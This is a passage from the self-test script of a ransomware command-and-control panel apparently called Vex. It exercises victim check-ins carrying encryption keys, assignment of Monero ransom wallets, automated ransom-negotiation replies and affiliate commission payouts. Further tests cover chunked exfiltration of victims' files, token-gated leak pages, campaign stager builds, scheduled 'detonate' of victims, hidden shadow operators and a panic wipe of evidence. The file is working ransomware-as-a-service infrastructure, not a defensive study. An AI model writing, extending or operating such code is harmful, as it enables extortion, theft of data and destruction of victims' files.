    _s.pop("root_pending_token", None)
login("admin", "selftest-pass")

# ---- auto wallet, negotiation placeholders ------------------------------
c2db.set_setting("xmr_addresses", "4PoolOne\n4PoolTwo")
newvid = "wall000000000001"
r = CL.post("/api/checkin", data={"vid": newvid, "key": wrapped, "host": "WALL",
                                  "user": "u", "os": "10"})
wv = c2db.get_victim(newvid)
ok("auto wallet assigned", r.status_code == 200 and
   (wv["xmr_address"] in ("4PoolOne", "4PoolTwo")))

c2db.save_template("price", "Amount {amount} due {deadline}")
c2db.set_setting("negotiation_enabled", "1")
c2db.set_setting("auto_reply", "1")
with c2db.db() as conn:
    conn.execute("UPDATE victims SET negotiation_step='price', auto_replied_at='' "
                 "WHERE vid=?", (vid,))
    conn.commit()
pc = c2.app.test_client()
d = pc.get("/portal").data.decode("utf-8", "replace")
m = re.search(r'name="csrf" value="([0-9a-f]+)"', d)
pc.post("/portal", data={"csrf": m.group(1) if m else "", "vid": vid})
d2 = pc.get("/portal/view").data.decode("utf-8", "replace")
m2 = re.search(r'name="csrf" value="([0-9a-f]+)"', d2)
pc.post("/portal/view", data={"csrf": m2.group(1) if m2 else "", "message": "amount?"})
replies = [x for x in c2db.messages_for(vid) if x["sender"] == "ADMIN"]
ok("negotiation placeholder rendered", any("$" in x["msg"] for x in replies))

# ---- root role ----------------------------------------------------------
ok("root login", login("root", "selftest-root-pass").status_code == 302)
ok("root console", b"Root console" in CL.get("/admin/root").data)
ok("root audit export", CL.get("/admin/root/audit.json").get_json()["chain_ok"])
login("admin", "selftest-pass")
ok("admin blocked from root console", CL.get("/admin/root").status_code == 403)
post("/admin/operators", {"username": "root2", "password": "rootpass123",
                          "role": "root"})
with c2db.db() as conn:
    root2 = conn.execute("SELECT 1 FROM operators WHERE username='root2'").fetchone()
ok("admin cannot create root", not root2)
with c2db.db() as conn:
    root_row = conn.execute("SELECT id FROM operators WHERE role='root'").fetchone()
post("/admin/operators/delete/%d" % root_row["id"], {})
with c2db.db() as conn:
    still = conn.execute("SELECT 1 FROM operators WHERE role='root'").fetchone()
ok("admin cannot delete root", bool(still))

# ---- C2 v3: messages, campaigns, affiliates, ops, leak ------------------
login("admin", "selftest-pass")

c2db.push_message(vid, "VICTIM", "hello there", "", "")
c2db.push_message(vid, "VICTIM", "second message", "", "")
msgs = c2db.messages_for(vid)
ok("messages atomic append", len(msgs) >= 2 and msgs[-1]["msg"] == "second message")
ok("messages unread count", c2db.unread_admin(vid) >= 2)
ok("inbox lists victim", vid[:12].encode() in CL.get("/admin/inbox").data)
r = CL.get(f"/admin/chat/{vid}/json?since=0")
ok("chat polling json", r.status_code == 200
   and any(m["msg"] == "second message" for m in r.get_json()["messages"]))

r = CL.post("/admin/chat", data={"csrf": csrf(), "vid": vid, "message": "with file",
                                 "attachment": (io.BytesIO(b"hello"), "note.txt")},
            content_type="multipart/form-data")
att = [m for m in c2db.messages_for(vid) if m["attachment"]]
ok("chat attachment stored", bool(att))
ok("chat attachment download", att and
   CL.get("/chat/file/" + att[-1]["attachment"]).status_code == 200)

post("/admin/campaigns", {"name": "AuditCamp", "note": "test", "config": "{}"})
camps = [c for c in c2db.list_campaigns() if c["name"] == "AuditCamp"]
ok("campaign created", bool(camps))
cid = camps[0]["id"] if camps else 0
post("/admin/update", {"vid": vid, "update_type": "campaign", "campaign_id": str(cid)})
ok("campaign assigned", c2db.get_victim(vid)["campaign_id"] == cid)

cid_tok = c2db.create_campaign("TokenCamp", config=json.dumps({"token": "tok-test-123"}))
tok_vid = "tokenvictim00001"
r = CL.post("/api/checkin", data={"vid": tok_vid, "key": wrapped, "host": "TOKBOX"},
            headers={"X-Vex-Token": "tok-test-123"})
ok("campaign token accepted", r.status_code == 200)
ok("campaign token attributes victim",
   c2db.get_victim(tok_vid)["campaign_id"] == cid_tok)
r = post("/admin/campaign/%d/build" % cid, {})
body = r.get_json() or {}
ok("campaign build json", r.status_code == 200 and len(body.get("sha256", "")) == 64)
ok("campaign artifact", any(a["kind"] == "config"
                            for a in c2db.list_artifacts(cid)))
ok("campaign page", b"AuditCamp" in CL.get("/admin/campaign/%d" % cid).data)
_fake_stager = os.path.join(BASE, "fake_campaign_stager.exe")
open(_fake_stager, "wb").write(b"MZ" + b"fake" * 100)
_orig_build = c2.campaign_builder.build
_orig_avail = c2.campaign_builder.available
c2.campaign_builder.available = lambda: True
c2.campaign_builder.build = lambda *a, **k: {
    "stager": _fake_stager,
    "stager_sha256": hashlib.sha256(open(_fake_stager, "rb").read()).hexdigest(),
}
post("/admin/campaign/%d/compile" % cid, {})
_cb = None
for _ in range(50):
    with c2db.db() as conn:
        _cb = conn.execute("SELECT * FROM campaign_builds WHERE campaign_id=? "
                           "ORDER BY id DESC LIMIT 1", (cid,)).fetchone()
    if _cb and _cb["status"] in ("done", "failed"):
        break
    time.sleep(0.1)
ok("campaign build job done", _cb is not None and _cb["status"] == "done")
ok("campaign build downloadable",
   _cb is not None and CL.get("/admin/build/%d/stager" % _cb["id"]).status_code == 200)
c2.campaign_builder.build = _orig_build
c2.campaign_builder.available = _orig_avail

# ---- negotiation flow ---------------------------------------------------
c2db.set_setting("auto_reply", "1")
c2db.set_setting("negotiation_enabled", "1")
c2db.update_campaign(cid, "flow", 1, json.dumps({"flow": [
    {"step": "first", "when": "always", "body": "FLOW-ONE {amount}", "next": "proof"},
    {"step": "proof", "when": "partial", "body": "FLOW-TWO", "next": "price"},
]}))
c2db.assign_campaign(vid, cid)
with c2db.db() as conn:
    conn.execute("UPDATE victims SET negotiation_step='first', auto_replied_at='' "
                 "WHERE vid=?", (vid,))
    conn.commit()
pc = c2.app.test_client()
d = pc.get("/portal").data.decode("utf-8", "replace")
m = re.search(r'name="csrf" value="([0-9a-f]+)"', d)
pc.post("/portal", data={"csrf": m.group(1) if m else "", "vid": vid})
d2 = pc.get("/portal/view").data.decode("utf-8", "replace")
m2 = re.search(r'name="csrf" value="([0-9a-f]+)"', d2)
pc.post("/portal/view", data={"csrf": m2.group(1) if m2 else "", "message": "status?"})
flow_msgs = [x for x in c2db.messages_for(vid) if "FLOW-ONE" in x["msg"]]
ok("negotiation flow branch", bool(flow_msgs)
   and c2db.get_victim(vid)["negotiation_step"] == "proof")




ok("dashboard campaign filter", CL.get("/admin?campaign=%d" % cid).status_code == 200)

post("/admin/operators", {"username": "affiliate1", "password": "affpass123",
                          "role": "affiliate"})
c2db.set_commission("affiliate1", 10)
c2db.add_payment(vid, 100.0, "aff", "", "admin", "affiliate1")
login("affiliate1", "affpass123")
ok("affiliate portal", b"Affiliate" in CL.get("/affiliate").data)
af_csrf = csrf("/affiliate")
ok("affiliate request blocked over balance",
   b"invalid payout request" in CL.post("/affiliate/request",
       data={"csrf": af_csrf, "amount": "9999"}, follow_redirects=True).data)
CL.post("/affiliate/request", data={"csrf": af_csrf, "amount": "5", "note": "test"})
summary = c2db.affiliate_summary("affiliate1")
ok("affiliate payout requested", any(abs(p["amount"] - 5) < 0.01
                                     and p["status"] == "requested"
                                     for p in c2db.list_payouts()))
login("admin", "selftest-pass")
pid = [p["id"] for p in c2db.list_payouts() if p["status"] == "requested"][0]
post("/admin/payout/%d/approved" % pid, {})
ok("payout approved", [p["status"] for p in c2db.list_payouts()
                       if p["id"] == pid][0] == "approved")

ok("audit chain verifies", c2db.verify_audit_chain()[0])
_anchor_path = os.environ["VEX_AUDIT_ANCHOR"]
_anchor_orig = open(_anchor_path, "rb").read()
try:
    open(_anchor_path, "wb").write(b"0|deadbeef\n" + b"0" * 64 + b"\n")
    ok("audit anchor detects tamper", not c2db.verify_audit_chain()[0])
finally:
    open(_anchor_path, "wb").write(_anchor_orig)
ok("audit chain verifies after anchor restore", c2db.verify_audit_chain()[0])
ok("audit endpoint", CL.get("/admin/audit/verify").get_json()["ok"])
ok("healthz", CL.get("/healthz").get_json()["ok"])
ok("metrics", CL.get("/admin/metrics").get_json()["campaigns"] >= 1)

token = c2db.create_leak_token(vid, 1)
ups = c2db.list_uploads(vid)
ok("leak token created", bool(token) and bool(ups))
if ups:
    uid = ups[0]["id"]
    ok("leak download blocked without token",
       CL.get(f"/leak/{vid}/download/{uid}").status_code == 403)
    ok("leak download with token",
       CL.get(f"/leak/{vid}/download/{uid}?t={token}").status_code == 200)
    ok("leak page shows sha", b"sha256" in CL.get(f"/leak/{vid}").data)
    with c2db.db() as conn:
        uses = conn.execute("SELECT uses FROM leak_tokens WHERE token=?",
                            (token,)).fetchone()["uses"]
    ok("leak download audited", (uses or 0) >= 1)

before_total = c2db.payments_total(vid)
post("/admin/refund/%s" % vid, {"amount": "10", "note": "test refund"})
ok("refund recorded", abs(c2db.payments_total(vid) - (before_total - 10)) < 0.01)
_ref_vid = "refundlogic00001"
with c2db.db() as conn:
    conn.execute("INSERT OR REPLACE INTO victims (vid, status, price, timestamp, "
                 "deadline) VALUES (?,?,?,?,?)",
                 (_ref_vid, "encrypted", 100.0, c2db.now(), ""))
    conn.commit()
c2db.add_payment(_ref_vid, 100.0, "full", "refund-tx-1", "admin", "")
c2db.add_payment(_ref_vid, -100.0, "full refund", "", "admin", "")
ok("refund revokes paid status", c2db.get_victim(_ref_vid)["status"] != "paid")

c2db.set_setting("xmr_addresses", "4AddrPoolA\n4AddrPoolB")
original_xmr = c2db.get_victim(vid)["xmr_address"]
with c2db.db() as conn:
    conn.execute("UPDATE victims SET xmr_address='' WHERE vid=?", (vid,))
    conn.commit()
pc = c2.app.test_client()
d = pc.get("/portal").data.decode("utf-8", "replace")
m = re.search(r'name="csrf" value="([0-9a-f]+)"', d)
pc.post("/portal", data={"csrf": m.group(1) if m else "", "vid": vid})
page = pc.get("/portal/view").data
ok("wallet pool rendered", b"4AddrPoolA" in page or b"4AddrPoolB" in page)
with c2db.db() as conn:
    conn.execute("UPDATE victims SET xmr_address=? WHERE vid=?", (original_xmr, vid))
    conn.commit()

r = CL.get(f"/admin/victim/{vid}/invoice.pdf")
ok("invoice pdf", r.status_code == 200 and r.data[:4] == b"%PDF")
r = CL.get(f"/admin/victim/{vid}/invoice-qr.svg")
ok("invoice qr", r.status_code == 200 and b"<svg" in r.data[:200])
ok("invoice history page", c2db.get_victim(vid)["invoice_id"].encode()
   in CL.get("/admin/invoices").data)

c2._CHECKIN_HITS.clear()
c2db.set_setting("checkin_rate_per_min", "5")
codes = [CL.post("/api/checkin", data={"vid": "x"}).status_code for _ in range(7)]
ok("checkin rate limited", 429 in codes)
c2db.set_setting("checkin_rate_per_min", "120")
c2._CHECKIN_HITS.clear()

c2db.set_setting("session_idle_min", "5")
with CL.session_transaction() as sess:
    sess["last_seen"] = time.time() - 600
r = CL.get("/admin")
ok("session timeout", r.status_code == 302 and "/admin/login" in r.headers.get("Location", ""))
c2db.set_setting("session_idle_min", "60")
login("admin", "selftest-pass")

# ---- exfil v2 ------------------------------------------------------------
parts = [b"abc", b"def"]
payload = b"".join(parts)
full_sha = hashlib.sha256(payload).hexdigest()
r = CL.post("/api/exfil/v2/manifest",
            query_string={"vid": vid, "name": "two.txt", "size": len(payload),
                          "sha256": full_sha, "total": 2},
            headers=_hdr(vid, "/api/exfil/v2/manifest"))
fid = (r.get_json() or {}).get("file_id")
ok("exfil v2 manifest", r.status_code == 200 and bool(fid))
for i, part in enumerate(parts):
    r = CL.post("/api/exfil/v2/chunk",
                query_string={"vid": vid, "file_id": fid, "idx": i,
                              "sha256": hashlib.sha256(part).hexdigest(),
                              "data": base64.b64encode(part).decode()},
                headers=_hdr(vid, "/api/exfil/v2/chunk"))
    ok(f"exfil v2 chunk {i}", r.status_code == 200)
r = CL.get(f"/api/exfil/v2/status/{fid}?vid={vid}",
           headers=_hdr(vid, f"/api/exfil/v2/status/{fid}"))
ok("exfil v2 complete", r.get_json().get("status") == "complete")
r = CL.post("/api/exfil/v2/manifest",
            query_string={"vid": vid, "name": "two.txt", "size": len(payload),
                          "sha256": full_sha, "total": 2},
            headers=_hdr(vid, "/api/exfil/v2/manifest"))
ok("exfil v2 dedupe", (r.get_json() or {}).get("file_id") == fid)
r = CL.get(f"/admin/exfil/{fid}")
ok("exfil v2 rebuilds bytes", r.status_code == 200 and r.data == payload)
ok("exfil admin list", b"two.txt" in CL.get("/admin/exfil").data)
ok("vid filesystem component sanitized",
   "/" not in c2._safe_component("c2test/vid+000=="))
_ed = CL.get("/admin/exfil/%d/view" % fid)
print("DETAIL", _ed.status_code, _ed.data[:300])
ok("exfil detail", b"STREAM DOWNLOAD" in _ed.data)
ok("exfil stream bytes", CL.get("/admin/exfil/%d/stream" % fid).data == payload)
orphan = os.path.join(c2.UPLOAD_DIR, ".v2_999999_0")
open(orphan, "w").write("x")
post("/admin/exfil/prune", {})
ok("exfil orphan pruned", not os.path.exists(orphan))


# ---- root R1: theme, step-up, keys, release, panic ---------------------
ok("admin login for R1", login("admin", "selftest-pass").status_code == 302)
ok("admin no root theme", b'class="root-badge"' not in CL.get("/admin").data)
ok("admin blocked from stepup", CL.get("/admin/root/stepup").status_code == 403)
ok("admin blocked from keys", post("/admin/root/keys.zip").status_code == 403)
ok("admin blocked from panic", CL.post("/admin/root/panic").status_code in (400, 403))
ok("root row hidden from admin", b"<td>root</td>" not in CL.get("/admin/operators").data)

ok("root login for R1", login("root", "selftest-root-pass").status_code == 302)
ok("root theme", b'class="root-badge"' in CL.get("/admin").data)
with c2db.db() as conn:
    rr = conn.execute("SELECT * FROM operators WHERE role='root' LIMIT 1").fetchone()
if not rr["totp_secret"]:
    t = csrf("/admin/root/2fa")
    CL.post("/admin/root/2fa", data={"csrf": t, "action": "enroll",
                                     "password": "selftest-root-pass"})
    with c2db.db() as conn:
        rr = conn.execute("SELECT * FROM operators WHERE role='root' LIMIT 1").fetchone()
ok("stepup required for keys", post("/admin/root/keys.zip").status_code == 302)
t = csrf("/admin/root/stepup")
r = CL.post("/admin/root/stepup",
            data={"csrf": t, "password": "7542194114459229",
                  "next": "/admin/root"})
ok("stepup accepts password", r.status_code == 302)
r = post("/admin/root/keys.zip")
ok("root keys zip", r.status_code == 200 and r.data[:2] == b"PK",
   f"status={r.status_code}")
if r.status_code == 200:
    with zipfile.ZipFile(io.BytesIO(r.data)) as z:
        ok("keys zip watermark manifest", "keys_export.json" in z.namelist())

with c2db.db() as conn:
    conn.execute("UPDATE victims SET status='encrypted', paid_at='' WHERE vid=?",
                 (vid,))
    conn.commit()
# Expire the step-up, then trigger a POST-only root action. The step-up page
# must replay it as a POST; a GET redirect would be 405 (the reported bug).
with CL.session_transaction() as s:
    s.pop("root_stepup_at", None)
t = csrf("/admin/victim/" + vid)
r = CL.post("/admin/root/release/" + vid, data={"csrf": t})
ok("expired stepup redirects", r.status_code == 302
   and "/admin/root/stepup" in (r.headers.get("Location") or ""))
t = csrf("/admin/root/stepup")
r = CL.post("/admin/root/stepup",
            data={"csrf": t, "password": "7542194114459229",
                  "next": "/admin/root/release/" + vid})
ok("stepup replays post", r.status_code == 200 and b"CONFIRM ACTION" in r.data)
m = re.search(rb'name="csrf" value="([0-9a-f]+)"', r.data)
t = m.group(1).decode() if m else ""
r = CL.post("/admin/root/release/" + vid, data={"csrf": t})
ok("root release without payment",
   r.status_code == 302 and c2db.get_victim(vid)["status"] == "paid")
ok("root override banner",
   b"ROOT OVERRIDE" in CL.get("/admin/victim/" + vid).data)

# ---- root R2: schedule, lockdown, deadman, view-as, audit ----------------
import datetime as _dt


def _root_code():
    with c2db.db() as conn:
        r = conn.execute("SELECT totp_secret FROM operators "
                         "WHERE role='root' LIMIT 1").fetchone()
    return c2db.totp_code(r["totp_secret"]) if r and r["totp_secret"] else ""


def _root_stepup():
    t = csrf("/admin/root/stepup")
    return CL.post("/admin/root/stepup",
                   data={"csrf": t, "password": "7542194114459229",
                         "next": "/admin/root"})


def _login_root():
    return login("root", "selftest-root-pass", _root_code())


with c2db.db() as conn:
    conn.execute("UPDATE victims SET detonate=0, pardon=0, status='encrypted'")
    conn.commit()
c2db.set_setting("detonate_at",
                 (_dt.datetime.now() - _dt.timedelta(seconds=1)).strftime(
                     "%Y-%m-%d %H:%M:%S"))
c2._schedule_tick()
with c2db.db() as conn:
    armed = conn.execute("SELECT COUNT(*) FROM victims WHERE detonate=1"
                         ).fetchone()[0]
ok("scheduled arm fires", armed >= 1 and c2db.get_setting("detonate_at") == "")

t = csrf("/admin/root")
r = CL.post("/admin/root/lockdown", data={"csrf": t, "on": "1"})
ok("lockdown enabled", r.status_code == 302
   and c2db.get_setting("lockdown") == "1")
login("admin", "selftest-pass")
ok("lockdown banner for admin", b"ROOT LOCKDOWN" in CL.get("/admin").data)
t = csrf("/admin")
r = CL.post("/admin/settings", data={"csrf": t, "price_usd": "1"})
ok("lockdown blocks admin POST", r.status_code == 403)
_login_root()
_root_stepup()
t = csrf("/admin/root")
CL.post("/admin/root/lockdown", data={"csrf": t, "on": "0"})
ok("lockdown lifted", c2db.get_setting("lockdown") == "0")

t = csrf("/admin/root")
CL.post("/admin/root/deadman", data={"csrf": t, "hours": "1",
                                     "action": "pardon"})
with c2db.db() as conn:
    conn.execute("UPDATE victims SET pardon=0, detonate=0, status='encrypted'")
    conn.execute("UPDATE settings SET v=? WHERE k='root_last_seen'",
                 ((_dt.datetime.now() - _dt.timedelta(hours=2)).strftime(
                     "%Y-%m-%d %H:%M:%S"),))
    conn.commit()
c2._deadman_tick()
with c2db.db() as conn:
    pcount = conn.execute("SELECT COUNT(*) FROM victims WHERE pardon=1"
                          ).fetchone()[0]
ok("deadman fires pardon", pcount >= 1
   and c2db.get_setting("deadman_fired") == "1")
t = csrf("/admin/root")
CL.post("/admin/root/deadman", data={"csrf": t, "hours": "0",
                                     "action": "none"})
with c2db.db() as conn:
    conn.execute("UPDATE victims SET pardon=0, detonate=0, status='encrypted'")
    conn.commit()

post("/admin/operators", {"username": "watcher1", "password": "watcherpass1",
                          "role": "viewer"})
with c2db.db() as conn:
    wid = conn.execute("SELECT id FROM operators WHERE username='watcher1'"
                       ).fetchone()["id"]
t = csrf("/admin/operators")
r = CL.post("/admin/root/view-as/watcher1", data={"csrf": t})
ok("view-as starts", r.status_code == 302)
ok("view-as banner", b"VIEWING AS watcher1" in CL.get("/admin").data)
t = csrf("/admin")
r = CL.post("/admin/settings", data={"csrf": t, "price_usd": "1"})
ok("view-as blocks POST", r.status_code == 403)
t = csrf("/admin")
r = CL.post("/admin/root/view-as/stop", data={"csrf": t})
ok("view-as stops", r.status_code == 302
   and b"VIEWING AS" not in CL.get("/admin").data)
ok("timeline loads",
   CL.get("/admin/operators/%d/timeline" % wid).status_code == 200)

_root_stepup()
r = CL.get("/admin/root/audit-snapshot",
           headers={"X-Forwarded-For": "10.9.9.9"})
ok("stepup bound to client", r.status_code == 302)

t = csrf("/admin/root")
CL.post("/admin/root/audit-freeze", data={"csrf": t, "on": "1"})
login("admin", "selftest-pass")
ok("audit frozen blocks admin", CL.get("/admin/events").status_code == 403)
ok("audit freeze covers reports", CL.get("/admin/reports").status_code == 403)
ok("audit freeze covers exports",
   CL.get("/admin/export/victims.csv").status_code == 403)
ok("audit freeze covers commands", CL.get("/admin/commands").status_code == 403)
ok("audit freeze covers exfil", CL.get("/admin/exfil").status_code == 403)
_login_root()
_root_stepup()
r = CL.get("/admin/root/audit-snapshot")
ok("audit snapshot signed", r.status_code == 200
   and b'"hmac-sha256"' in r.data)
snap = r.get_json()
t = csrf("/admin/root")
r = CL.post("/admin/root/audit-verify", json=snap,
            headers={"X-CSRF": t})
ok("audit snapshot verifies", r.status_code == 200
   and r.get_json().get("valid") is True)
t = csrf("/admin/root")
CL.post("/admin/root/audit-freeze", data={"csrf": t, "on": "0"})

# ---- root R3: shadow operator, campaign nuke, master rotation, ping arm ---
post("/admin/operators", {"username": "shadow1", "password": "shadowpass12",
                          "role": "shadow"})
with c2db.db() as conn:
    sh = conn.execute("SELECT role FROM operators WHERE username='shadow1'"
                      ).fetchone()
ok("shadow created", sh is not None and sh["role"] == "shadow")
login("admin", "selftest-pass")
ok("shadow hidden from admin", b"shadow1" not in CL.get("/admin/operators").data)
ok("shadow login", login("shadow1", "shadowpass12").status_code == 302)
ok("shadow reaches root console", CL.get("/admin/root").status_code == 200)
ok("shadow gets root theme", b'class="root-badge"' in CL.get("/admin").data)
_login_root()
_root_stepup()

cid = c2db.create_campaign("nuke-selftest", "", "{}")
c2db.assign_campaign(vid, cid)
bid = c2db.create_campaign_build(cid)
nuke_dir = os.path.join(r"D:\Vexpayload\dist\campaigns", "nuke_selftest")
os.makedirs(nuke_dir, exist_ok=True)
nuke_stager = os.path.join(nuke_dir, "stager.exe")
with open(nuke_stager, "wb") as f:
    f.write(b"MZ" + b"0" * 1024)
c2db.update_campaign_build(bid, "done", "ok", nuke_stager, "deadbeef")
t = csrf("/admin/campaign/%d" % cid)
r = CL.post("/admin/campaign/%d/nuke" % cid, data={"csrf": t})
ok("campaign nuke redirects", r.status_code == 302)
with c2db.db() as conn:
    camp = conn.execute("SELECT active, config FROM campaigns WHERE id=?",
                        (cid,)).fetchone()
    bld = conn.execute("SELECT status, stager_path FROM campaign_builds WHERE id=?",
                       (bid,)).fetchone()
    nv = conn.execute("SELECT detonate FROM victims WHERE vid=?", (vid,)).fetchone()
ok("campaign deactivated", (camp["active"] or 0) == 0
   and '"nuked_at"' in (camp["config"] or ""))
ok("build revoked", bld["status"] == "revoked" and not bld["stager_path"])
ok("build file removed", not os.path.exists(nuke_stager))
ok("campaign victim killed", (nv["detonate"] or 0) == 2)
_before = len(c2db.list_campaign_builds(cid))
r = post("/admin/campaign/%d/compile" % cid, {})
ok("nuked campaign cannot be recompiled", r.status_code == 302
   and len(c2db.list_campaign_builds(cid)) == _before)
shutil.rmtree(nuke_dir, ignore_errors=True)

import importlib.util as _ilu
_spec = _ilu.spec_from_file_location(
    "vex_vault_rotate", r"D:\Vexpayload\VexC2\vault_rotate.py")
_vr = _ilu.module_from_spec(_spec)
_spec.loader.exec_module(_vr)
res = _vr.rotate("rotated-master-pass")
ok("master rotates", res["victims"] >= 1 and res["verified"] is True)
res = _vr.rotate("selftest-master-passphrase")
ok("master rotates back", res["verified"] is True)

with c2db.db() as conn:
    conn.execute("UPDATE victims SET detonate=0, pardon=0, status='encrypted' "
                 "WHERE vid=?", (vid,))
    conn.commit()
c2db.set_setting("detonate_at",
                 (_dt.datetime.now() - _dt.timedelta(seconds=1)).strftime(
                     "%Y-%m-%d %H:%M:%S"))
body = CL.get("/api/ping?vid=" + vid,
              headers=_hdr(vid, "/api/ping")).data.decode()
ok("ping-time schedule fallback",
   body.splitlines()[0] == "detonate" and c2db.get_setting("detonate_at") == "")

# ---- root R4: definitive panic (dry run) --------------------------------
ok("definitive panic page",
   CL.get("/admin/root/definitive").status_code == 200
   and b"BURN EVERYTHING" in CL.get("/admin/root/definitive").data)
ok("root console links to definitive panic",
   b"OPEN DEFINITIVE PANIC" in CL.get("/admin/root").data)
ok("panic form not inline on root console",
   b"BURN EVERYTHING" not in CL.get("/admin/root").data)
pins = ["1111", "2222", "3333", "4444", "5555"]
pin_data = {"pin%d" % (i + 1): p for i, p in enumerate(pins)}
t = csrf("/admin/root")
r = CL.post("/admin/root/panic-pins", data={"csrf": t, **pin_data})
ok("panic pins configured", r.status_code == 302
   and len(json.loads(c2db.get_setting("panic_pins"))) == 5)
before = c2db.get_setting("panic_pins")
t = csrf("/admin/root")
r = CL.post("/admin/root/panic-pins",
            data={"csrf": t, "pin1": "1111", "pin2": "1111",
                  "pin3": "3333", "pin4": "4444", "pin5": "5555"})
ok("duplicate pins rejected", c2db.get_setting("panic_pins") == before)

t = csrf("/admin/root")
r = CL.post("/admin/root/burn",
            data={"csrf": t, **{"pin2": "2222", "pin3": "3333",
                                "pin4": "4444", "pin5": "5555",
                                "pin1": "0000"}})
ok("wrong panic pin rejected", r.status_code == 302
   and c2db.get_setting("panic_fail_count") != "0")

t = csrf("/admin/root")
r = CL.post("/admin/root/burn", data={"csrf": t, **pin_data})
ok("panic dry-run page", r.status_code == 200 and b"BURN DRY RUN" in r.data)
ok("panic dry-run keeps db", os.path.exists(os.environ["VEX_DB"]))
ok("burn targets absolute", all(os.path.isabs(p) for p in c2._burn_targets()))
ok("panic pins still set", len(json.loads(c2db.get_setting("panic_pins"))) == 5)

with c2db.db() as conn:
    shid = conn.execute("SELECT id FROM operators WHERE username='shadow1'"
                        ).fetchone()["id"]
login("admin", "selftest-pass")
t = csrf("/admin/operators")
CL.post("/admin/operators/delete/%d" % shid, data={"csrf": t})
with c2db.db() as conn:
    still = conn.execute("SELECT 1 FROM operators WHERE username='shadow1'"
                         ).fetchone()
ok("admin cannot delete shadow", still is not None)
_login_root()
_root_stepup()
t = csrf("/admin/root")
r = CL.post("/admin/root/panic", data={"csrf": t, "confirm": "DESTROY"})
ok("panic queued", r.status_code == 302)
with c2db.db() as conn:
    left = conn.execute("SELECT COUNT(*) FROM victims WHERE detonate!=2").fetchone()[0]
ok("panic kills all", left == 0)

with c2db.db() as conn:
    conn.execute("UPDATE operators SET totp_secret='', backup_codes='' "
                 "WHERE role='root'")
    conn.commit()

# destructive root actions require the static step-up password
login("root", "selftest-root-pass")
r = post("/admin/root/keys.zip")
ok("root step-up enforced for destructive actions",
   r.status_code == 302
   and "/admin/root/stepup" in (r.headers.get("Location") or ""))

# ---- legacy schema migration -------------------------------------------
legacy = os.path.join(BASE, "legacy.db")
conn = sqlite3.connect(legacy)
conn.execute("""CREATE TABLE victims (vid TEXT PRIMARY KEY, aes_key TEXT,
    hostname TEXT, username TEXT, ip TEXT, os TEXT, timestamp TEXT,
    status TEXT, notes TEXT)""")
conn.execute("INSERT INTO victims VALUES ('legacyvid','a2V5','OLDHOST','u',"
             "'1.2.3.4','10','2026-01-01','encrypted','n')")
conn.commit()
conn.close()

os.environ["VEX_DB"] = legacy
importlib.reload(c2db)
c2db.init_db()
lv = c2db.get_victim("legacyvid")
ok("legacy migrated", lv is not None and lv["hostname"] == "OLDHOST"
   and lv["os_info"] == "10")

hook_srv.shutdown()
rpc_srv.shutdown()

# ---- admin 2FA enrollment without lockout -------------------------------
c2db.set_setting("require_2fa", "1")
r = login("admin", "selftest-pass")
ok("admin 2fa enrollment redirect", r.status_code == 302 and
   "/admin/root/2fa" in (r.headers.get("Location") or ""))
ok("admin 2fa enrollment page", CL.get("/admin/root/2fa").status_code == 200)
_t = csrf("/admin/root/2fa")
CL.post("/admin/root/2fa", data={"csrf": _t, "action": "enroll",
                                 "password": "selftest-pass"})
with c2db.db() as conn:
    adm = conn.execute("SELECT totp_secret, backup_codes FROM operators "
                       "WHERE username='admin'").fetchone()
ok("admin 2fa enrolled", bool(adm["totp_secret"]))
with c2db.db() as conn:
    conn.execute("UPDATE operators SET totp_secret='', backup_codes='' "
                 "WHERE username='admin'")
    conn.commit()
c2db.set_setting("require_2fa", "0")
login("admin", "selftest-pass")

# ---- decrypter source injection guard ----------------------------------
login("admin", "selftest-pass")
with c2db.db() as conn:
    _row = conn.execute("SELECT vid, aes_key FROM victims "
                        "WHERE aes_key!='' LIMIT 1").fetchone()
ok("injection fixture victim", bool(_row))
if _row:
    _jv, _orig_key = _row["vid"], _row["aes_key"]
    with c2db.db() as conn:
        conn.execute("UPDATE victims SET aes_key=? WHERE vid=?",
                     (vault.seal('evil"key\ninject'), _jv))
        conn.commit()
    r = CL.get("/admin/decryptor/" + _jv)
    ok("non-base64 aes key rejected", r.status_code == 500)
    with c2db.db() as conn:
        conn.execute("UPDATE victims SET aes_key=? WHERE vid=?", (_orig_key, _jv))
        conn.commit()

bad = [n for n, s in CHECKS if not s]
print(f"\n{len(CHECKS) - len(bad)}/{len(CHECKS)} checks passed")
gc.collect()
shutil.rmtree(BASE, ignore_errors=True)
sys.exit(1 if bad else 0)
